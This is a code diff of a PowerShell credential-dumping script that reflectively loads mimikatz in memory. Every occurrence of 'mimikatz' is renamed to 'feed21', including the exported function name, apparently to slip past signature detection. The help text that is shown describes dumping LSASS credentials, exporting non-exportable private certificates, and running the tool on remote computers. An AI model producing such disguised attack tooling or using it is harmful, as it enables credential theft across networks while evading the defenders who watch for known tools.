@@ -4,7 +4,7 @@ function Invoke-FEED21
 .SYNOPSIS
 
 This script leverages FEED21 2.0 and Invoke-ReflectivePEInjection to reflectively load FEED21 completely in memory. This allows you to do things such as
-dump credentials without ever writing the mimikatz binary to disk. 
+dump credentials without ever writing the feed21 binary to disk. 
 The script has a ComputerName parameter which allows it to be executed against multiple computers.
 
 This script should be able to dump credentials from any version of Windows through Windows 8.1 that has PowerShell v2 or higher installed.
@@ -24,15 +24,15 @@ functionality provided with FEED21.
 
 .PARAMETER DumpCreds
 
-Switch: Use mimikatz to dump credentials out of LSASS.
+Switch: Use feed21 to dump credentials out of LSASS.
 
 .PARAMETER DumpCerts
 
-Switch: Use mimikatz to export all private certificates (even if they are marked non-exportable).
+Switch: Use feed21 to export all private certificates (even if they are marked non-exportable).
 
 .PARAMETER Command
 
-Supply mimikatz a custom command line. This works exactly the same as running the mimikatz executable like this: mimikatz "privilege::debug exit" as an example.
+Supply feed21 a custom command line. This works exactly the same as running the feed21 executable like this: feed21 "privilege::debug exit" as an example.
 
 .PARAMETER ComputerName
 
@@ -40,27 +40,27 @@ Optional, an array of computernames to run the script on.
 	
 .EXAMPLE
 
-Execute mimikatz on the local computer to dump certificates.
+Execute feed21 on the local computer to dump certificates.
 Invoke-FEED21 -DumpCerts
 
 .EXAMPLE
 
-Execute mimikatz on two remote computers to dump credentials.
+Execute feed21 on two remote computers to dump credentials.
 Invoke-FEED21 -DumpCreds -ComputerName @("computer1", "computer2")
 
 .EXAMPLE
 
-Execute mimikatz on a remote computer with the custom command "privilege::debug exit" which simply requests debug privilege and exits
+Execute feed21 on a remote computer with the custom command "privilege::debug exit" which simply requests debug privilege and exits
 Invoke-FEED21 -Command "privilege::debug exit" -ComputerName "computer1"
 
 .NOTES
 This script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the FEED21 code written by Benjamin DELPY
 Find Invoke-ReflectivePEInjection at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection
-Find mimikatz at: http://blog.gentilkiwi.com
+Find feed21 at: http://blog.gentilkiwi.com
 
 .LINK
 
-http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
+http://clymb3r.wordpress.com/2013/04/09/modifying-feed21-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
 #>
 
 [CmdletBinding(DefaultParameterSetName="DumpCreds")]
@@ -2633,7 +2633,7 @@ $RemoteScriptBlock = {
 			### YOUR CODE GOES HERE
 			#########################################
                     Write-Verbose "Calling function with WString return type"
-				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "powershell_reflective_mimikatz"
+				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "powershell_reflective_feed21"
 				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
 				    {
 					    Throw "Couldn't find function address."
